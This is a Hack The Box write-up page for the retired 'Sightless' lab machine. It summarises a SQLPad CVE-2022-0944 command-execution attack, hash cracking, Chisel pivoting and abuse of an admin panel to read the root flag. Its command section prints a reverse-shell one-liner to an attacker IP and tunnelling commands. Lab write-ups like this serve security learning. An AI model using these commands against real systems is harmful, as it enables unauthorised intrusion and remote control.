@@ -1,0 +1,83 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>HTB Sightless | Daniel Galindo</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Space+Grotesk:wght@400;500;700&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="/src/styles/styles.css" />
+  </head>
+  <body data-page="writeups">
+    <div class="grid-overlay" aria-hidden="true"></div>
+    <div class="noise-overlay" aria-hidden="true"></div>
+
+    <header class="site-header">
+      <a class="site-logo" href="/en/index.html">met4ll0f</a>
+      <nav class="site-nav" aria-label="Main navigation">
+        <a data-nav="home" href="/en/index.html">Home</a>
+        <a data-nav="writeups" href="/en/writeups.html">Writeups</a>
+        <a data-nav="scripts" href="/en/scripts.html">Scripts</a>
+      </nav>
+    </header>
+
+    <section class="hero hero-compact">
+      <p class="hero-kicker">Hack The Box - Container and Admin Panel Abuse</p>
+      <h1>HTB Sightless</h1>
+      <p class="headline">SQLPad RCE, container shadow cracking and internal admin panel command execution</p>
+      <p class="meta">Retired - Root / Administrator</p>
+    </section>
+
+    <main class="writeup-article">
+      <section class="panel panel-large">
+<h2>Executive Summary</h2>
+<p>Sightless exposes SQLPad 6.10.0. CVE-2022-0944 gives command execution through the connection-test endpoint and a reverse shell inside a Docker container.</p>
+<h2>Initial Access</h2>
+<p>Container enumeration reveals user material including password hashes. Cracking the relevant hash recovers SSH credentials for <code>michael</code>.</p>
+<h2>Internal Pivot</h2>
+<p>From the host, local ports show an internal service on 8080. Chisel reverse forwarding exposes internal services to the attacker machine, and Chrome remote inspection captures credentials when the user interacts with the portal.</p>
+<h2>Privilege Escalation</h2>
+<p>The admin panel allows defining a PHP-FPM restart command. Setting it to copy <code>/root/root.txt</code> into <code>/tmp</code>, then changing permissions, exposes the root flag without needing a full root shell.</p>
+<h2>Key Commands</h2>
+<pre><code class="language-bash">python3 exploit.py -u http://sightless.htb/sqlpad -c &quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.3/4444 0&gt;&amp;1&#39;&quot;</code></pre>
+<pre><code class="language-bash">chisel server -p 9999 --reverse</code></pre>
+<pre><code class="language-bash">./chisel client 10.10.16.3:9999 R:8080:127.0.0.1:8080</code></pre>
+<pre><code class="language-bash">cp /root/root.txt /tmp/root.txt</code></pre>
+<pre><code class="language-bash">chmod 644 /tmp/root.txt</code></pre>
+<h2>Evidence Trail</h2>
+<p>The following screenshots preserve the original lab evidence sequence from the Obsidian notes.</p>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/sightless/Pasted%20image%2020241004105158.png" alt="sightless evidence 01" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/sightless/Pasted%20image%2020241004105425.png" alt="sightless evidence 02" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/sightless/Pasted%20image%2020241004112521.png" alt="sightless evidence 03" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/sightless/Pasted%20image%2020241004112811.png" alt="sightless evidence 04" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/sightless/Pasted%20image%2020241004112843.png" alt="sightless evidence 05" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/sightless/Pasted%20image%2020241004120551.png" alt="sightless evidence 06" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/sightless/Pasted%20image%2020241004113357.png" alt="sightless evidence 07" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/sightless/Pasted%20image%2020241004122859.png" alt="sightless evidence 08" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/sightless/Pasted%20image%2020241004123627.png" alt="sightless evidence 09" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/sightless/Pasted%20image%2020241004123806.png" alt="sightless evidence 10" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/sightless/Pasted%20image%2020241004124222.png" alt="sightless evidence 11" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/sightless/Pasted%20image%2020241004130455.png" alt="sightless evidence 12" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/sightless/Pasted%20image%2020241005164004.png" alt="sightless evidence 13" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/sightless/Pasted%20image%2020241005164158.png" alt="sightless evidence 14" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/sightless/Pasted%20image%2020241005164300.png" alt="sightless evidence 15" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/sightless/Pasted%20image%2020241005170743.png" alt="sightless evidence 16" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/sightless/Pasted%20image%2020241005170859.png" alt="sightless evidence 17" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/sightless/Pasted%20image%2020241005171545.png" alt="sightless evidence 18" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/sightless/Pasted%20image%2020241005171735.png" alt="sightless evidence 19" /></figure>
+      </section>
+    </main>
+
+    <footer class="footer">
+      <p>© <span class="js-year"></span> <span class="js-name"></span>.</p>
+      <a href="/en/writeups.html">Back to writeups</a>
+    </footer>
+
+    <script type="module" src="/src/js/site.js"></script>
+    <script type="module" src="/src/js/writeup-media.js"></script>
+  </body>
+</html>
